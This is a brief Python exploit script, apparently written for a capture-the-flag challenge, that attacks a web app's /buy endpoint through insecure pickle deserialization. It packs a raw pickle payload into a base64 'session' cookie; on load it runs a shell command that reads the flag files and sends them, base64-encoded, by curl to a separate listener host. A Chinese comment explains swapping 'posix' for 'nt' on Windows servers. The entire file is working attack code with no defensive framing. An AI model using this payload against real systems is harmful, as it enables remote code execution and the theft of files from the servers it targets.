import requests
import base64

target = "http://192.168.65.129"

#因为服务器是Linux，所以是posix;如果服务器是Windows，改成nt
payload =b'cposix\nsystem\np0\n(Vcurl http://192.168.65.1:2333/`cat flag* | base64`\np1\ntp2\nRp3\n.'


if __name__ == "__main__":
    exp = base64.b64encode(payload).decode("utf-8")
    cookie = {"session": exp}
    print(cookie)

    session = requests.session()
    r = session.post(url = target + "/buy", cookies = cookie)
    print(r.text)